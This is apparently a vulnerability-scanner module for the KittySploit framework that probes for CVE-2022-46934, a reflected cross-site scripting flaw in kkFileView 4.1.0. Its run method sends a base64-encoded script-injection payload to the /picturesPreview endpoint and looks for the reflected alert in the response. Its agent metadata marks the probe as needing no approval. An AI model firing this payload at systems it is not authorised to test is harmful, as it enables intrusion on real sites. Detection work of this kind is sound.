#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""kkFileView 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'kkFileView 4.1.0 - Cross-Site Scripting Detection',
        'description': 'kkFileView 4.1.0 is susceptible to cross-site scripting via the url parameter at /controller/OnlinePreviewController.java. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'kkfileview', 'keking', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/kekingcn/kkFileView/issues/411',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-46934',
        ],
        'cve': 'CVE-2022-46934',
    }

    def run(self):
        r = self.http_request(method="GET", path='/picturesPreview?currentUrl=aHR0cDovLyIpO2FsZXJ0KGRvY3VtZW50LmRvbWFpbik7Ly8=&urls', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('document.getElementById("http://");alert(document.domain);//").click();', 'viewer.min.css',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="kkFileView 4.1.0 - Cross-Site Scripting detected",
                path='/picturesPreview?currentUrl=aHR0cDovLyIpO2FsZXJ0KGRvY3VtZW50LmRvbWFpbik7Ly8=&urls',
            )
            return True
        return False

